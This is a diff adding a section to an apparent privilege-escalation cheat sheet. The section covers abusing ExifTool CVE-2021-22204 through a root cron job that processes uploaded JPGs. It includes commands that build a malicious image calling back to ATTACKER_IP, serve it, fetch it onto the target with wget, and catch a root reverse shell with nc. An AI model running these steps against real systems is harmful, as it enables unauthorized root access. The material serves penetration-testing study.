@@ -1507,6 +1507,62 @@ Then wait with:
 nc -nlvp 9003
 ```
 
+#### ExifTool CVE-2021-22204 via root cron image processing
+
+Look for root-run scripts that process writable image upload directories with `exiftool`:
+
+```bash
+ls -la /opt
+cat /opt/image-exif.sh
+```
+
+Important pattern:
+
+```bash
+IMAGES='/var/www/html/subrion/uploads'
+META='/opt/metadata'
+
+ls $IMAGES | grep "jpg" | while read filename;
+do
+    exiftool "$IMAGES/$filename" >> $LOGFILE
+done
+```
+
+Confirm the scheduled root execution with `pspy`:
+
+```text
+CMD: UID=0 | bash /opt/image-exif.sh
+CMD: UID=0 | bash /opt/image-exif.sh
+```
+
+Create a CVE-2021-22204 malicious image payload:
+
+```bash
+sudo apt install djvulibre-bin
+python3 exif.py -s ATTACKER_IP 9001
+# Exploit image written to 'image.jpg'
+
+python3 -m http.server 8000
+nc -nlvp 9001
+```
+
+Place the payload where the cron job processes JPGs:
+
+```bash
+cd /var/www/html/subrion/uploads
+wget http://ATTACKER_IP:8000/image.jpg
+```
+
+When the cron job processes the image, the callback is root:
+
+```text
+connect to [ATTACKER_IP] from TARGET
+/bin/sh: 0: can't access tty; job control turned off
+#
+```
+
+Reference: https://www.exploit-db.com/exploits/50911
+
 ### Cron Jobs Path Environment Variable
 
 * View the contents of the system-wide crontab:
